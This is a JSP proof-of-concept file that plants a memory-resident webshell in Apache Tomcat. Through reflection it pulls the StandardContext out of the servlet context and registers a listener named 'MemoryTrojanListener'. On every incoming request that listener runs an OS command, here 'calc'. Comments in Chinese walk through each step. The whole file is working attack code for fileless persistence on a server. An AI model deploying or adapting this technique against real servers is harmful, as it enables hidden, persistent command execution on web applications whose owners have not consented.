<%@ page import="javax.servlet.annotation.WebListener" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %><%--
  Created by IntelliJ IDEA.
  User: hasee
  Date: 2023/5/5
  Time: 19:40
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Title</title>
</head>
<body>
<%!
    @WebListener("MemoryTrojanListener")
    public class MemoryTrojanListener implements ServletRequestListener {

        @Override
        public void requestDestroyed(ServletRequestEvent sre) {

        }

        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            try {
                Runtime.getRuntime().exec("calc");
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
    }
%>
<%
    // 1. 获取 StandardContext
    ServletContext servletContext = request.getServletContext();
    // ServletContext 中有 ApplicationContext，ApplicationContext 中又有 StandardContext。通过反射获取到 ApplicationContextField。
    Field applicationContextField = servletContext.getClass().getDeclaredField("context");
    applicationContextField.setAccessible(true);
    // 通过反射拿到 servletContext 具体的 ApplicationContext
    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
    // 重复上述过程，从具体的 ApplicationContext 中拿到具体的 StandardContext
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

    // 2. 通过 standardContext 添加 listener
    standardContext.addApplicationEventListener(new MemoryTrojanListener());
%>
</body>
</html>
